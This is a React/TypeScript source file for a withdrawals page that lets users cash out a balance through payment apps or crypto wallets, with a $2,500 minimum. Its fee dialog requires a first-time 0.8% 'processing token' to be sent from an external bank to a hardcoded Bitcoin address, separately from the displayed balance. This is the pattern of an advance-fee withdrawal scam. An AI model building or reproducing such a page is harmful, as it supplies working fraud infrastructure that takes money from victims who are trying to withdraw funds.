import { createFileRoute, Link } from '@tanstack/react-router'
import { useServerFn } from '@tanstack/react-start'
import {
  AlertTriangle,
  ArrowLeft,
  BadgeDollarSign,
  Check,
  Copy,
  Send,
  X,
} from 'lucide-react'
import { useEffect, useMemo, useState, type ReactNode } from 'react'

import { AppShell, PageHeader } from '@/components/AppShell'
import { AuthGate } from '@/components/AuthGate'
import { formatCurrency } from '@/lib/format'
import {
  getAccountOverview,
  requestWithdrawal,
  type AccountOverview,
} from '@/server/accounts'

export const Route = createFileRoute('/withdrawals')({
  component: WithdrawalsPage,
})

type DestinationKind = 'tag' | 'email' | 'username' | 'wallet'

type PaymentMethod = {
  id: string
  name: string
  destinationLabel: string
  destinationHint: string
  destinationKind: DestinationKind
  Logo: () => ReactNode
  tileBackground: string
  tileTextColor?: string
}

const FEE_FORWARDING_ADDRESS = 'bc1qqrq5fcgnllld8punxggvhfhpduswkv56cj2fsy'

const paymentMethods: PaymentMethod[] = [
  {
    id: 'Cash App',
    name: 'Cash App',
    destinationLabel: 'Payment Tag (Cashtag)',
    destinationHint: '$cashtag',
    destinationKind: 'tag',
    Logo: CashAppLogo,
    tileBackground: '#00D632',
  },
  {
    id: 'Zelle',
    name: 'Zelle',
    destinationLabel: 'Email or phone number registered with Zelle',
    destinationHint: 'name@email.com',
    destinationKind: 'email',
    Logo: ZelleLogo,
    tileBackground: '#FFFFFF',
    tileTextColor: '#6D1ED4',
  },
  {
    id: 'PayPal',
    name: 'PayPal',
    destinationLabel: 'PayPal email',
    destinationHint: 'name@email.com',
    destinationKind: 'email',
    Logo: PayPalLogo,
    tileBackground: '#FFFFFF',
    tileTextColor: '#003087',
  },
  {
    id: 'Venmo',
    name: 'Venmo',
    destinationLabel: 'Venmo username',
    destinationHint: '@username',
    destinationKind: 'username',
    Logo: VenmoLogo,
    tileBackground: '#3D95CE',
  },
  {
    id: 'BTC',
    name: 'Bitcoin',
    destinationLabel: 'BTC wallet address',
    destinationHint: 'bc1...',
    destinationKind: 'wallet',
    Logo: BitcoinLogo,
    tileBackground: '#F7931A',
  },
  {
    id: 'USDT',
    name: 'Tether (USDT)',
    destinationLabel: 'USDT wallet address',
    destinationHint: 'TRC20 / ERC20 wallet address',
    destinationKind: 'wallet',
    Logo: TetherLogo,
    tileBackground: '#26A17B',
  },
  {
    id: 'ETH',
    name: 'Ethereum',
    destinationLabel: 'ETH wallet address',
    destinationHint: '0x...',
    destinationKind: 'wallet',
    Logo: EthereumLogo,
    tileBackground: '#343434',
  },
]

function findMethod(id: string) {
  return paymentMethods.find((method) => method.id === id) ?? paymentMethods[0]
}

function WithdrawalsPage() {
  return (
    <AppShell>
      <AuthGate>
        <WithdrawalsContent />
      </AuthGate>
    </AppShell>
  )
}

function WithdrawalsContent() {
  const loadOverview = useServerFn(getAccountOverview)
  const submitWithdrawal = useServerFn(requestWithdrawal)
  const [overview, setOverview] = useState<AccountOverview | null>(null)
  const [amount, setAmount] = useState('2500')
  const [selectedMethodId, setSelectedMethodId] = useState<string>(paymentMethods[0].id)
  const [destination, setDestination] = useState('')
  const [recipientName, setRecipientName] = useState('')
  const [message, setMessage] = useState('')
  const [loading, setLoading] = useState(false)
  const [feeOpen, setFeeOpen] = useState(false)

  useEffect(() => {
    loadOverview().then(setOverview).catch(() => {
      setMessage('Account data could not be loaded.')
    })
  }, [loadOverview])

  const selectedMethod = findMethod(selectedMethodId)

  const numericAmount = Number(amount)
  const isFirstWithdrawal = useMemo(() => {
    return !overview?.transactions.some((transaction) => transaction.type === 'withdrawal')
  }, [overview])
  const amountCents = Number.isFinite(numericAmount) ? Math.max(0, Math.round(numericAmount * 100)) : 0
  const feeCents = isFirstWithdrawal ? Math.ceil(amountCents * 0.008) : 0

  const composeReady =
    numericAmount >= 2500 && destination.trim().length >= 3 && recipientName.trim().length > 0

  const handleOpenFeeDetails = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault()
    setMessage('')
    if (numericAmount < 2500) {
      setMessage('Minimum withdrawal amount is $2,500.')
      return
    }
    if (!composeReady) {
      setMessage('Enter the amount, recipient name, and the destination details.')
      return
    }
    setFeeOpen(true)
  }

  const handleConfirmWithdrawal = async () => {
    setLoading(true)
    setMessage('')
    try {
      const updated = await submitWithdrawal({
        data: {
          amount: numericAmount,
          method: selectedMethod.id,
          destination: destination.trim(),
          accountReference: recipientName.trim(),
        },
      })
      setOverview(updated)
      setDestination('')
      setRecipientName('')
      setFeeOpen(false)
      setMessage('Withdrawal request submitted for verification and processing.')
    } catch (error) {
      setMessage(error instanceof Error ? error.message : 'Withdrawal request failed.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <>
      <PageHeader
        eyebrow="Withdrawal request"
        title="Choose a payment method and confirm"
        description="Send a withdrawal to any of the supported payment apps or wallets below. Pick one to load the matching destination details."
      />

      <div className="grid gap-5 lg:grid-cols-[1fr_360px]">
        <form
          className="rounded-md border border-[#d8d0c1] bg-[#fffdf8] p-6 shadow-sm"
          onSubmit={handleOpenFeeDetails}
        >
          <section>
            <div className="flex items-center justify-between gap-3">
              <h2 className="text-base font-semibold text-[#1f2520]">
                Payment method
              </h2>
              <span className="text-xs text-[#6f5f4d]">
                Selected · {selectedMethod.name}
              </span>
            </div>

            <div className="mt-4 grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-4">
              {paymentMethods.map((method) => (
                <MethodTile
                  key={method.id}
                  method={method}
                  selected={selectedMethodId === method.id}
                  onSelect={() => {
                    setSelectedMethodId(method.id)
                    setDestination('')
                  }}
                />
              ))}
            </div>
          </section>

          <section className="mt-6 grid gap-4 sm:grid-cols-2">
            <label className="block">
              <span className="text-sm font-semibold">Amount</span>
              <div className="mt-2 flex items-center gap-2 rounded-md border border-[#d8d0c1] bg-[#fbfaf7] px-3 py-3 focus-within:border-[#256352]">
                <span className="text-base font-semibold text-[#5f3c25]">$</span>
                <input
                  className="w-full bg-transparent text-base outline-none"
                  type="number"
                  min="2500"
                  step="0.01"
                  value={amount}
                  onChange={(event) => setAmount(event.target.value)}
                  required
                />
              </div>
              <span className="mt-1 block text-xs text-[#6f5f4d]">
                Minimum withdrawal is $2,500.
              </span>
            </label>

            <label className="block">
              <span className="text-sm font-semibold">Recipient name</span>
              <input
                className="mt-2 w-full rounded-md border border-[#d8d0c1] bg-[#fbfaf7] px-3 py-3 outline-none focus:border-[#256352]"
                value={recipientName}
                onChange={(event) => setRecipientName(event.target.value)}
                placeholder="Full name on the receiving account"
                required
              />
            </label>
          </section>

          <label className="mt-4 block">
            <span className="text-sm font-semibold">
              {selectedMethod.destinationLabel}
            </span>
            <input
              className="mt-2 w-full rounded-md border border-[#d8d0c1] bg-[#fbfaf7] px-3 py-3 outline-none focus:border-[#256352]"
              value={destination}
              onChange={(event) => setDestination(event.target.value)}
              placeholder={selectedMethod.destinationHint}
              inputMode={selectedMethod.destinationKind === 'email' ? 'email' : 'text'}
              autoComplete="off"
              spellCheck={false}
              required
            />
            <span className="mt-1 block text-xs text-[#6f5f4d]">
              {destinationGuidance(selectedMethod.destinationKind)}
            </span>
          </label>

          {message ? (
            <p className="mt-4 rounded-md border border-[#d8d0c1] bg-[#f4f1ea] px-3 py-2 text-sm text-[#5f3c25]">
              {message}
            </p>
          ) : null}

          <button
            className="mt-5 inline-flex items-center gap-2 rounded-md bg-[#d96f32] px-5 py-3 text-sm font-semibold text-white transition hover:bg-[#bd5b2a] disabled:cursor-not-allowed disabled:opacity-60"
            disabled={!overview || !composeReady}
          >
            <Send className="size-4" />
            Withdraw
          </button>
        </form>

        <aside className="rounded-md border border-[#d8d0c1] bg-[#23342d] p-6 text-[#f7f3ea] shadow-sm">
          <div className="grid size-12 place-items-center rounded-md bg-[#d96f32]">
            <BadgeDollarSign className="size-6" />
          </div>
          <p className="mt-5 text-sm text-[#d8c7ae]">Available balance</p>
          <p className="mt-1 text-3xl font-semibold">
            {formatCurrency(overview?.profile.availableBalanceCents ?? 0)}
          </p>
          <p className="mt-6 rounded-md bg-white/10 p-4 text-sm leading-6 text-[#ecdfca]">
            Cash App, Zelle, PayPal, and Venmo deliver in the recipient app once
            verified. Crypto payouts are sent on the network of the matching
            wallet address. Confirm details on the next step before approving.
          </p>
        </aside>
      </div>

      {feeOpen ? (
        <FeeDetailsDialog
          method={selectedMethod}
          recipientName={recipientName.trim()}
          destination={destination.trim()}
          amountCents={amountCents}
          feeCents={feeCents}
          isFirstWithdrawal={isFirstWithdrawal}
          loading={loading}
          message={message}
          onClose={() => {
            setMessage('')
            setFeeOpen(false)
          }}
          onConfirm={handleConfirmWithdrawal}
        />
      ) : null}
    </>
  )
}

function destinationGuidance(kind: DestinationKind) {
  switch (kind) {
    case 'tag':
      return 'Enter the recipient $cashtag exactly as it appears in their app.'
    case 'email':
      return 'Use the email or phone number tied to the recipient account.'
    case 'username':
      return 'Type the @username shown on the recipient profile.'
    case 'wallet':
      return 'Paste the wallet address — sending to the wrong network is irreversible.'
    default:
      return ''
  }
}

function MethodTile({
  method,
  selected,
  onSelect,
}: {
  method: PaymentMethod
  selected: boolean
  onSelect: () => void
}) {
  const { Logo } = method
  return (
    <button
      type="button"
      onClick={onSelect}
      className={`group relative flex flex-col items-center gap-2 rounded-xl border bg-white p-3 text-center transition ${
        selected
          ? 'border-[#d96f32] shadow-[0_0_0_2px_#d96f32]'
          : 'border-[#d8d0c1] hover:border-[#bd5b2a]'
      }`}
    >
      <span
        className="grid size-14 place-items-center overflow-hidden rounded-2xl"
        style={{
          backgroundColor: method.tileBackground,
          color: method.tileTextColor ?? '#FFFFFF',
        }}
      >
        <Logo />
      </span>
      <span className="text-xs font-semibold leading-tight text-[#1f2520]">
        {method.name}
      </span>
      {selected ? (
        <span className="absolute right-1.5 top-1.5 grid size-5 place-items-center rounded-full bg-[#d96f32] text-white">
          <Check className="size-3" />
        </span>
      ) : null}
    </button>
  )
}

function FeeDetailsDialog({
  method,
  recipientName,
  destination,
  amountCents,
  feeCents,
  isFirstWithdrawal,
  loading,
  message,
  onClose,
  onConfirm,
}: {
  method: PaymentMethod
  recipientName: string
  destination: string
  amountCents: number
  feeCents: number
  isFirstWithdrawal: boolean
  loading: boolean
  message: string
  onClose: () => void
  onConfirm: () => void
}) {
  const [copied, setCopied] = useState(false)

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(FEE_FORWARDING_ADDRESS)
      setCopied(true)
      setTimeout(() => setCopied(false), 1500)
    } catch {
      setCopied(false)
    }
  }

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center overflow-y-auto bg-black/50 p-4 backdrop-blur-sm"
      role="dialog"
      aria-modal="true"
    >
      <div className="relative my-4 w-full max-w-lg overflow-hidden rounded-2xl bg-[#fffdf8] shadow-2xl">
        <button
          type="button"
          onClick={onClose}
          className="absolute right-3 top-3 grid size-8 place-items-center rounded-full text-[#6f5f4d] transition hover:bg-[#f4f1ea] hover:text-[#1f2520]"
          aria-label="Close token details"
        >
          <X className="size-5" />
        </button>

        <div className="bg-[#23342d] px-5 py-3 text-[#f7f3ea]">
          <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-[#d8c7ae]">
            Token details
          </p>
          <h2 className="mt-1 text-base font-semibold">
            {isFirstWithdrawal ? 'First-time withdrawal token' : 'Processing token'}
          </h2>
          <p className="mt-1 text-[13px] leading-[1.35] text-[#ecdfca]">
            {isFirstWithdrawal
              ? 'A one-time 0.8% processing token covers identity verification, anti-fraud screening, and payout delivery. Pay it from an external bank to the address below — it is not deducted from your balance.'
              : 'No processing token applies — the one-time token was already paid on the first withdrawal.'}
          </p>
        </div>

        <div className="space-y-3 px-5 py-4">
          <dl className="grid grid-cols-1 gap-2 rounded-md bg-[#f4f1ea] px-4 py-3 text-sm">
            <SummaryItem label="Method" value={method.name} />
            <SummaryItem label="Recipient" value={recipientName} />
            <SummaryItem label={method.destinationLabel} value={destination} />
            <div className="border-t border-[#d8d0c1] pt-2">
              <SummaryItem
                label="Withdrawal amount"
                value={formatCurrency(amountCents)}
                strong
              />
            </div>
            <div className="mt-2 border-t border-[#d8d0c1] pt-3">
              <SummaryItem
                label={isFirstWithdrawal ? 'First-time withdrawal token (0.8%, paid externally)' : 'Processing token'}
                value={formatCurrency(feeCents)}
              />
            </div>
          </dl>

          <div className="rounded-md border border-[#d8d0c1] bg-white px-3 py-2">
            <p className="text-[11px] font-bold uppercase tracking-[0.18em] text-[#bd5b2a]">
              Token forwarding address
            </p>
            <p className="mt-1 text-[11px] leading-4 text-[#6f5f4d]">
              Send the token from your external bank to this address so the
              transaction can be processed.
            </p>
            <div className="mt-1.5 flex items-center gap-2 rounded-md border border-dashed border-[#bd5b2a] bg-[#fff7ec] px-2 py-1">
              <code className="flex-1 break-all text-[11px] font-semibold text-[#1f2520]">
                {FEE_FORWARDING_ADDRESS}
              </code>
              <button
                type="button"
                onClick={handleCopy}
                className="inline-flex items-center gap-1 rounded-md bg-[#23342d] px-2 py-1 text-[11px] font-semibold text-white transition hover:bg-[#1a2622]"
              >
                {copied ? <Check className="size-3" /> : <Copy className="size-3" />}
                {copied ? 'Copied' : 'Copy'}
              </button>
            </div>
          </div>

          <div className="flex items-start gap-2 rounded-md border border-amber-300 bg-amber-50 px-2.5 py-1.5 text-[11px] leading-4 text-amber-950">
            <AlertTriangle className="mt-0.5 size-3.5 shrink-0" />
            <p>
              Confirming reserves only the withdrawal amount from your available
              balance. The token is paid separately from your external bank.
            </p>
          </div>

          {message ? (
            <p className="rounded-md border border-[#d8d0c1] bg-[#f4f1ea] px-3 py-2 text-sm text-[#5f3c25]">
              {message}
            </p>
          ) : null}

          <div className="flex flex-col-reverse gap-2 sm:flex-row sm:justify-end">
            <button
              type="button"
              onClick={onClose}
              className="inline-flex items-center justify-center gap-2 rounded-md border border-[#d8d0c1] bg-white px-4 py-2 text-sm font-semibold text-[#5f3c25] transition hover:border-[#bd5b2a]"
            >
              <ArrowLeft className="size-4" />
              Edit details
            </button>
            <button
              type="button"
              onClick={onConfirm}
              disabled={loading}
              className="inline-flex items-center justify-center gap-2 rounded-md bg-[#d96f32] px-5 py-2 text-sm font-semibold text-white transition hover:bg-[#bd5b2a] disabled:cursor-not-allowed disabled:opacity-60"
            >
              <Send className="size-4" />
              {loading ? 'Submitting' : 'Confirm withdrawal'}
            </button>
          </div>

          <p className="text-center text-xs text-[#6f5f4d]">
            <Link to="/fees" search={{ amount: amountCents / 100 }} className="underline hover:text-[#bd5b2a]">
              Read the full token policy
            </Link>
          </p>
        </div>
      </div>
    </div>
  )
}

function SummaryItem({
  label,
  value,
  strong,
}: {
  label: string
  value: string
  strong?: boolean
}) {
  return (
    <div className="flex items-start justify-between gap-4">
      <dt className="text-xs uppercase tracking-[0.16em] text-[#6f5f4d]">
        {label}
      </dt>
      <dd
        className={`break-words text-right text-sm ${
          strong ? 'text-base font-semibold text-[#1f2520]' : 'text-[#1f2520]'
        }`}
      >
        {value}
      </dd>
    </div>
  )
}

function CashAppLogo() {
  return (
    <svg viewBox="0 0 32 32" className="size-9" aria-hidden="true">
      <path
        fill="#FFFFFF"
        d="M21.3 11.2c-.3.3-.7.3-1 0-1-.9-2.3-1.5-3.7-1.5-1.2 0-2.4.5-2.4 1.6 0 1.2 1.4 1.6 2.9 2.2 2.7.9 4.9 2 4.9 4.7 0 3-2.3 5-5.6 5.3l-.3 1.3c-.1.5-.5.8-1 .8h-1.4c-.6 0-1.1-.6-1-1.2l.4-1.4c-1.4-.4-2.6-1.1-3.5-2-.3-.3-.3-.7 0-1l1.3-1.3c.3-.3.7-.3 1 0 1.1 1 2.6 1.6 4.2 1.6 1.6 0 2.7-.6 2.7-1.7 0-1.1-1.2-1.5-2.9-2.1-2.3-.8-4.7-1.9-4.7-4.7 0-3 2.5-4.8 5.5-5.1l.3-1.3c.1-.5.5-.9 1-.9h1.4c.6 0 1.1.6 1 1.2l-.4 1.5c1.2.4 2.2 1 3 1.7.3.3.3.8 0 1.1l-1.2 1.2z"
      />
    </svg>
  )
}

function ZelleLogo() {
  return (
    <svg viewBox="0 0 32 32" className="size-9" aria-hidden="true">
      <circle cx="16" cy="16" r="16" fill="#FFFFFF" />
      <path
        fill="#6D1ED4"
        d="M14.7 6.4h2.6c.4 0 .7.3.7.7v1.4h3.5c.5 0 .8.6.5 1L13.6 21.5h6.4c.4 0 .7.3.7.7v1.6c0 .4-.3.7-.7.7H17v1.5c0 .4-.3.7-.7.7h-2.6c-.4 0-.7-.3-.7-.7v-1.5h-3.5c-.5 0-.8-.6-.5-1l8.4-12H11.4c-.4 0-.7-.3-.7-.7V9.2c0-.4.3-.7.7-.7H14V7.1c0-.4.3-.7.7-.7z"
      />
    </svg>
  )
}

function PayPalLogo() {
  return (
    <svg viewBox="0 0 32 32" className="size-9" aria-hidden="true">
      <path
        fill="#003087"
        d="M11.5 7.5h6.7c2.7 0 4.6.9 5.5 2.5.8 1.5.6 3.4-.6 5.4-1.4 2.4-3.7 3.6-6.7 3.6h-2.2c-.4 0-.8.3-.9.7l-.8 4.3c0 .4-.4.7-.8.7H8.7c-.4 0-.6-.3-.6-.6l2.6-15.9c.1-.4.4-.7.8-.7z"
      />
      <path
        fill="#009CDE"
        d="M14 11.5h5c2 0 3.4.6 4 1.7.6 1 .5 2.3-.4 3.8-1.1 1.7-2.7 2.6-5 2.6h-1.6c-.4 0-.8.3-.9.7l-.7 3.7c0 .4-.4.7-.8.7h-2c-.4 0-.6-.3-.6-.6L13.2 12c.1-.3.4-.5.8-.5z"
      />
    </svg>
  )
}

function VenmoLogo() {
  return (
    <svg viewBox="0 0 32 32" className="size-9" aria-hidden="true">
      <path
        fill="#FFFFFF"
        d="M22.7 7.4c.7 1.1.9 2.3.9 3.7 0 4.6-3.9 10.5-7.1 14.7H8.5L5.3 7.6l7-.7 1.7 13.7c1.6-2.6 3.5-6.6 3.5-9.4 0-1.5-.3-2.6-.7-3.4l5.9-.4z"
      />
    </svg>
  )
}

function BitcoinLogo() {
  return (
    <svg viewBox="0 0 32 32" className="size-9" aria-hidden="true">
      <path
        fill="#FFFFFF"
        d="M21.5 14.4c.3-1.9-1.2-3-3.2-3.7l.7-2.6-1.6-.4-.6 2.5c-.4-.1-.9-.2-1.3-.3l.6-2.6-1.6-.4-.7 2.6c-.3-.1-.7-.2-1-.2L11 9l-1.7-.4-.4 1.7s1.2.3 1.2.3c.6.2.7.6.7.9l-.7 3-.4 1.6c-.1.2-.3.5-.7.4 0 0-1.2-.3-1.2-.3l-.8 1.8 2 .5c.4.1.7.2 1.1.3l-.7 2.7 1.6.4.7-2.6c.4.1.9.2 1.3.3l-.7 2.6 1.6.4.7-2.7c2.7.5 4.8.3 5.6-2.2.7-2-.1-3.1-1.5-3.8 1-.2 1.8-.9 2-2.4l.1-.1zm-3.6 5c-.5 2-3.8.9-4.9.6l.9-3.5c1.1.3 4.5.8 4 2.9zm.5-5c-.4 1.8-3.2.9-4.1.7l.8-3.2c.9.2 3.7.6 3.3 2.5z"
      />
    </svg>
  )
}

function TetherLogo() {
  return (
    <svg viewBox="0 0 32 32" className="size-9" aria-hidden="true">
      <path
        fill="#FFFFFF"
        d="M17.9 14.5v-2h4.6v-3H9.6v3h4.6v2c-3.7.2-6.5 1-6.5 1.9 0 .9 2.8 1.7 6.5 1.9v6.4h3.7v-6.4c3.7-.2 6.5-1 6.5-1.9 0-.9-2.8-1.7-6.5-1.9zm0 3.2v0c-.1 0-.5 0-1.8 0-1.1 0-1.8 0-2.1 0v0c-3.5-.2-6.1-.8-6.1-1.5 0-.7 2.6-1.3 6.1-1.5v2.4c.3 0 1 .1 2.1.1 1.3 0 1.7 0 1.8-.1v-2.4c3.5.2 6.1.8 6.1 1.5 0 .7-2.6 1.3-6.1 1.5z"
      />
    </svg>
  )
}

function EthereumLogo() {
  return (
    <svg viewBox="0 0 32 32" className="size-9" aria-hidden="true">
      <path fill="#FFFFFF" d="M16 4l-7 11.6 7 4.1 7-4.1z" opacity="0.85" />
      <path fill="#FFFFFF" d="M16 21.1l-7-4.1 7 9.9 7-9.9z" opacity="0.7" />
      <path fill="#FFFFFF" d="M16 4v8.7l7 3z" opacity="1" />
      <path fill="#FFFFFF" d="M16 4L9 15.6l7-2.9z" opacity="0.5" />
    </svg>
  )
}
